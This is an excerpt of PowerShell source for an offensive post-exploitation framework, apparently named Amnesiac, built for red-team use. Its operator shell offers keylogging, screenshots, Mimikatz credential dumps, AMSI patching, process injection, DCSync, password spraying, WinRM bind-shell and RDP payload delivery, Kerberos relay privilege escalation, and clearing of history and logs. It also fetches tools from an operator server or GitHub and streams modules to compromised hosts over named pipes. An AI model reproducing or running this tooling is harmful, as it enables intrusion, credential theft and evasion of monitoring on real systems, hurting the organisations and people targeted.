...
function Initialize-ToolCache {
    ...
    for ($_i = 0; $_i -lt $_cn.Count; $_i++) {
        try {
            ...
            Write-Output " [!] Failed to load core tool '$($_cn[$_i])': $_"
        }
    }

    # --- STANDARD TIER: local Tools\ directory ---
    $toolsDir = Join-Path $global:AmnesiacRoot "Tools"
    if (Test-Path $toolsDir) {
        Get-ChildItem -Path $toolsDir -Filter "*.ps1" | ForEach-Object {
            ...
            try {
                ...
                Write-Output " [!] Failed to load tool '$name' from Tools\: $_"
            }
        }
    }
...
function Fetch-ToolFromGitHub {
    ...
    # Build URL: operator server first, then per-tool overrides, then GitHub
    $urls = @()
    if ($global:OperatorServer) {
        $urls += "$($global:OperatorServer.TrimEnd('/'))/Tools/$ToolName.ps1"
    }
    if ($global:ToolSources -and $global:ToolSources.ContainsKey($ToolName)) {
        $urls += $global:ToolSources[$ToolName]
    } else {
        $urls += "https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/$ToolName.ps1"
    }
...
function Send-Module {
    ...
    # Gzip-compress before sending — PS scripts compress ~5:1, cutting transfer size dramatically
    $ms  = [System.IO.MemoryStream]::new()
    $gzs = [System.IO.Compression.GzipStream]::new($ms, [System.IO.Compression.CompressionMode]::Compress)
    ...
    # function definitions land in scope L and persist for subsequent commands.
    ...
    # Drain response lines until EndMarker (iex on a function-only module produces no output,
    # but we consume any stray lines to stay in sync with the target)
    do {
...
function Show-OpsecBanner {
    ...
    Write-Output ""
    Write-Output " [+] Amnesiac -- Red Team Edition"
    Write-Output " [+] Disk mode:        $diskState"
    Write-Output " [+] Engagement:       $engState"
    Write-Output " [+] Network token:    $tokenInfo"
    Write-Output " [+] Tool cache:       $cacheCount modules loaded"
    Write-Output " [+] End marker:       $($global:EndMarker)  (session-unique)"
    Write-Output " [+] Buffer size:      $($global:BufferSize) bytes"
    Write-Output " [+] Loader:           AmnesiacLoader ($loaderState)"
    Write-Output " [+] Auto-loader:      $autoState"
    Write-Output " [+] Payload profile:  amsi=$($global:PayloadConfig.Amsi) etw=$($global:PayloadConfig.Etw) launcher=$($global:PayloadConfig.Launcher) obfuscation=$($global:PayloadConfig.Obfuscation)"
    Write-Output " [+] PSK:              $pskState"
    ...
    if ($missing) {
        Write-Output " [!] Heavy modules not cached: $($missing -join ', ')"
        Write-Output "     Run 'serve' to enable via local HTTP server"
    }
    Write-Output ""
}
...
function Amnesiac {
    ...
    Write-Output " [+] serve auto-started (PID $_autoPid) — http://$_autoIP`:4443/"
	...
	trap [System.Management.Automation.PipelineStoppedException] {
		...
		Write-Output ""
		Write-Output " [!] Ctrl+C — Kill Amnesiac and all active sessions? [y/N]: "
		$Host.UI.RawUI.FlushInputBuffer()
...
function Start-LocalShell {
    ...
    $_cmd = @{
        ...
        'ClearHistory' = {
            ...
            if ($h -and (Test-Path $h)) { Remove-Item $h -Force; Write-Output ' [+] PSReadLine history cleared.' }
            ...
            Write-Output " [+] Cleared $($others.Count) additional history file(s)."
        }
        'ClearLogs' = {
        ...
        'KeylogRead' = {
            if ($global:KeylogFile -and (Test-Path $global:KeylogFile)) {
                ...
                Write-Output ' [-] No active keylog file. Start Keylog first and specify path.'
            }
        }
        'ScreenShot' = {
            try {
        ...
        'Screen4K' = {
            try {
                ...
                $bmp.Save($out); $g.Dispose(); $bmp.Dispose()
                Write-Output " [+] Screenshot (all monitors) saved: $out"
            } catch { Write-Output " [-] $_" }
        }
        'TLS' = {
        ...
        'MonitorRead' = {
            if ($global:TGTCache -and $global:TGTCache.Count -gt 0) {
                ...
                Write-Output ' [-] TGT cache empty. Start Monitor first.'
            }
        }
        'MonitorClear' = {
            $global:TGTCache = @()
            Write-Output ' [+] TGT monitor cache cleared.'
        }
    }
    ...
    Write-Output ""
    Write-Output " [+] Local Shell - $localFQDN [$localUser]"
    ...
    while ($true) {
        ...
        if ($cmd -eq 'help' -or $cmd -eq '?') {
            Write-Output ""
            Write-Output " [+] Shell:"
            Write-Output "   help / ?           This menu"
            Write-Output "   modules            List all cached tool names (for use with 'load')"
            Write-Output "   load <name>        Load any cached tool by its exact cache name"
            Write-Output "   back / exit        Return to session menu"
            Write-Output ""
            ...
            Write-Output "   Keylog             Start keylogger - use: KeyLog ""C:\path\log.txt"""
            Write-Output "   KeylogRead         Read keylog output"
            Write-Output "   ScreenShot         Take a screenshot [1080p]"
            Write-Output "   Screen4K           Take a screenshot [all monitors]"
            Write-Output ""
            Write-Output " [+] Scripts Loading:"
            Write-Output "   Mimi               Load Mimikatz - use: Mimi -Command ""sekurlsa::logonpasswords"""
            Write-Output "   Patch              Patch AMSI (stays active this session)"
            Write-Output "   PatchNet           Patch AMSI .NET"
            Write-Output "   PInject            Load process injection module"
            Write-Output "   PowerView          Load PowerView - use: Get-Domain, Find-DomainUser, etc."
            Write-Output "   Rubeus             Load Rubeus - use: Rubeus -Command ""triage"""
            ...
            Write-Output "   AutoMimi           Load Mimikatz and dump credentials immediately"
            Write-Output "   CredMan            Dump Windows Credential Manager"
            ...
            Write-Output "   CredValidate       Validate domain credentials - use: Validate-Credentials"
            Write-Output "   DCSync             Perform DCSync - use: Invoke-DCSync"
            Write-Output "   Impersonation      Token impersonation - use: Token-Impersonation"
            Write-Output "   LocalAdminAccess   Check targets for local admin access"
            Write-Output "   PassSpray          Domain password spray - use: Invoke-PassSpray"
            Write-Output "   Remoting           Remote command execution SMB/WMI - use: Invoke-SMBRemoting / Invoke-WMIRemoting"
            Write-Output "   winrm              Deliver bind shell via WinRM (no session, no admin) -- winrm computername=<ip> username=<dom\user> password=<pass>"
            Write-Output "   winrmscan          Find WinRM-accessible hosts -- winrmscan username=<dom\user> password=<pass> [range=10.x.x.1-254]"
        ...
        if ($cmd -eq 'modules') {
            if ($global:ToolCache.Count -eq 0) {
                Write-Output " [-] Tool cache empty - run 'modules reload' from main menu first."
            } else {
                Write-Output ""
                $global:ToolCache.Keys | Sort-Object | ForEach-Object { Write-Output "  [+] $_" }
                Write-Output ""
        ...
        if ($kwMatch) {
            ...
            foreach ($toolName in $kwDef.tools) {
                ...
                if ($cacheKey) {
                    ...
                    catch { Write-Output " [-] Failed to load ${toolName}: $($_.Exception.Message)"; $allOk = $false }
                } else {
                    Write-Output " [-] '$toolName' not in cache or GitHub."
                    $allOk = $false
                }
            }
            if ($allOk) {
                Write-Output " [+] $kwMatch loaded."
                ...
                if ($newFuncs.Count -gt 0) {
                    ...
                    Write-Output " [*] Available: $cap"
                }
                if ($kwDef.hint) {
                    Write-Output ""
                    $kwDef.hint | ForEach-Object { Write-Output $_ }
                }
                if ($kwDef.invoke) {
                    Write-Output ""
                    try   { Invoke-Expression $kwDef.invoke }
                    catch { Write-Output " [-] Auto-invoke failed: $($_.Exception.Message)" }
                }
            }
            continue
        }
        ...
        if ($cmd -match '^load\s+(.+)') {
            ...
            if ($cacheKey) {
                ...
                try {
                    ...
                    Write-Output " [-] Load error: $($_.Exception.Message)"
                }
            } else {
                Write-Output " [-] '$modName' not in cache or GitHub."
            }
            continue
        }
            ...
            if ($cacheKey) {
                try {
                    ...
                    if ($ep) {
                        ...
                        Write-Output " [-] No entry point found in '$binName'. Use 'load $binName' for DLLs."
                    }
                } catch {
                    Write-Output " [-] RunBin failed: $($_.Exception.Message)"
                }
            } else {
                Write-Output " [-] '$binName' not available. Ensure it is on the operator server or in Tools\."
            }
            continue
        }
        ...
        if ($cmd -match '^(?i)KrbRelayUp\s*(.*)') {
            ...
            if (-not $global:KrbRelayUpBin -or $global:KrbRelayUpBin -eq 'CONFIGURE_ME.exe') {
                Write-Output " [-] KrbRelayUp binary name not configured."
                Write-Output "     Set `$global:KrbRelayUpBin in Amnesiac_ShellReady.ps1 to the renamed binary filename."
                continue
            }
            ...
            if ($cacheKey) {
                try {
                    ...
                    $ep    = $asm.EntryPoint
                    if ($ep) {
                        Write-Output " [+] Invoking KrbRelayUp ..."
                        $ep.Invoke($null, @(,[string[]]$krb_binargs))
                    } else {
                        Write-Output " [-] No entry point in KrbRelayUp binary."
                    }
                } catch {
                    Write-Output " [-] KrbRelayUp error: $($_.Exception.Message)"
                }
            } else {
        ...
        if ($cmd -ieq 'serve') {
            if ($global:FileServerProcess -and -not $global:FileServerProcess.HasExited) {
                Write-Output " [+] serve already running (PID $($global:FileServerProcess.Id))"
                ...
                Write-Output " [*] Root:   http://$_srvIP`:4443/"
                if (Test-Path $_toolsPath) { Write-Output " [*] Tools:  $global:ServerURL" }
                Write-Output " [*] Loader: http://$_srvIP`:4443/Amnesiac_ShellReady.ps1"
                if ($global:LastSharpRDPCradleFile) {
                    Write-Output " [*] Pipe payload ready: http://$_srvIP`:4443/$($global:LastSharpRDPCradleFile)"
                }
            }
            continue
        }
        ...
        if ($cmd -match '^winrm\b(.*)') {
            ...
            try {
                ...
                Write-Output " [+] WinRM accessible on $_wTarget"
            } catch {
                Write-Output " [-] WinRM not accessible: $($_.Exception.Message)"
                Write-Output "     Ensure target is in Remote Management Users and port 5985 is reachable."
                continue
            }
            try {
        ...
        if ($cmd -match '^winrmscan\b(.*)') {
            ...
            $_wsUser = $_wsF['username']; $_wsPass = $_wsF['password']; $_wsRange = $_wsF['range']
            if (-not $_wsUser -or -not $_wsPass) { Write-Output " Usage: winrmscan username=<domain\user> password=<pass> [range=10.3.10.1-254]"; continue }
            ...
            Write-Output " [*] Scanning $($_wsHosts.Count) hosts for WinRM (port 5985) ..."
            ...
            if ($_wsHits.Count -eq 0) {
                Write-Output " [-] No hosts with WinRM access found for $_wsUser"
            } else {
                Write-Output " [*] $($_wsHits.Count) host(s) with WinRM access: $($_wsHits -join ', ')"
                Write-Output "     Run: winrm computername=<IP> username=$_wsUser password=$_wsPass"
            }
            continue
        }
        ...
        if ($cmd -match '^dcom\b(.*)') {
            ...
            try {
                if ($_dMethod -ieq 'ShellWindows') {
                    ...
                    Write-Output " [!] Unknown method '$_dMethod'. Use: ShellWindows, ShellBrowserWindow, or MMC20."
                }
                if ($_dOk) {
                ...
                Write-Output " [*] ShellWindows/ShellBrowserWindow: need active interactive session on target"
                Write-Output " [*] MMC20: requires local admin on target"
            }
            continue
        }
                ...
                try {
                    ...
                    if ($rdpArgs) {
                        ...
                        if ($global:LastSharpRDPCradleFile) {
                            ...
                            Write-Output " [*] Delivering via Win+R (use 'back' then wait for listener to catch the pipe)"
                        ...
                        Write-Output " [+] Invoke-SharpRDP loaded."
                        if ($global:LastSharpRDPB64) {
                            ...
                            if ($global:LastSharpRDPCradleFile) {
                                ...
                                Write-Output " [!] Ensure 'serve' is running -target fetches: http://$_opIP`:4443/$($global:LastSharpRDPCradleFile)"
                            }
                        } else {
                    ...
                    Write-Output " [-] SharpRDP failed: $($_.Exception.Message)"
                }
            } else {
        ...
        if ($cmd -imatch '^Migrate\s+(\d+)$') {
            ...
            try { PInject /t:1 /f:hex /pid:$targetPid /sc:$sc_mg /enc:AES } catch { Write-Output " [!] PInject: $($_.Exception.Message)" }
            Write-Output " [+] Connecting to pipe $PN (15s timeout)..."
            Start-Sleep -Seconds 2
            try {
                $mgClient = New-Object System.IO.Pipes.NamedPipeClientStream('.', $PN, [System.IO.Pipes.PipeDirection]::InOut)
...
function InteractWithPipeSession{
	...
	while ($true) {
		...
		if (-not $_loaderSent -and $global:AutoLoader -and -not [string]::IsNullOrEmpty($AmnesiacLoaderB64)) {
			...
			Write-Output " [+] AmnesiacLoader active (indirect syscalls, sleep masking, call stack spoofing)"
		} elseif (-not $_loaderSent -and $global:AutoLoader) {
			$_loaderSent = $true
			Write-Output " [!] Auto-loader: blob not embedded -- run AmnesiacLoader\Build.ps1 first"
		}
		...
		elseif ($command -match '^RunBin\s+(\S+)(.*)') {
			...
			if ($cacheKey) {
				Write-Output " [+] Streaming $binName to target..."
				if (Send-Module -ToolName $cacheKey -Writer $sw -Reader $sr) {
					...
					Write-Output " [+] $binName loaded -- executing on target..."
					$sw.WriteLine($invokeCmd)
					$sw.Flush()
				} else {
					Write-Output " [-] Failed to stream '$binName' to target."
				}
			} else {
				Write-Output " [-] '$binName' not available. Ensure it is on the operator server or in Tools\."
			}
...
function Get-AvailableCommands  {
	...
	Write-Output " KrbRelayUp         Kerberos relay LPE (low-priv domain user -> SYSTEM) -- KrbRelayUp full -m rbcd"
	Write-Output ""
	Write-Output " [*] [A] = local admin required   [DA] = domain admin required"
	Write-Output ""
}
